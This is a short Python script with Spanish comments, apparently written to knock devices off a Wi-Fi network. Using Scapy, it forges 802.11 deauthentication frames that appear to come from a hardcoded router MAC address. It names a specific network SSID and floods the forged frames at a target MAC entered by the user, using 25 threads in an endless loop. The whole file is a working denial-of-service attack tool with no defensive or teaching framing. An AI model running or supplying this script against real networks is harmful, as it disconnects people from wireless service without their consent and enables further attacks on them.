from scapy.all import *
import time
import threading

# Dirección MAC del router de destino
router_mac = "A4:15:88:E9:5F:11"

# Dirección MAC de destino (puede ser la misma que la del router)
destination_mac = input("MAC Destino >>")

# SSID de la red Wi-Fi
ssid = "FLORENTIN-RTC"

# Crear paquete de interferencia (paquete de deauth)
packet = RadioTap()/Dot11(addr1=destination_mac, addr2=router_mac, addr3=router_mac)/Dot11Deauth()

# Función para enviar paquetes de interferencia
def send_deauth_packets(interface, count, interval):
    for _ in range(count):
        sendp(packet, iface=interface, count=1, verbose=False)
        time.sleep(interval)

# Bucle para enviar continuamente paquetes de interferencia
while True:
    # Crear múltiples subprocesos para enviar paquetes simultáneamente
    threads = []
    for _ in range(25):  # Cambia el número de subprocesos según sea necesario
        thread = threading.Thread(target=send_deauth_packets, args=("wlp5s0", 100, 0.1))  # Cambia "wlan0" según tu interfaz
        threads.append(thread)
        thread.start()

    # Esperar a que todos los subprocesos terminen
    for thread in threads:
        thread.join()

    time.sleep(0.5)  # Espera 1 segundo antes de enviar el siguiente lote de paquetes
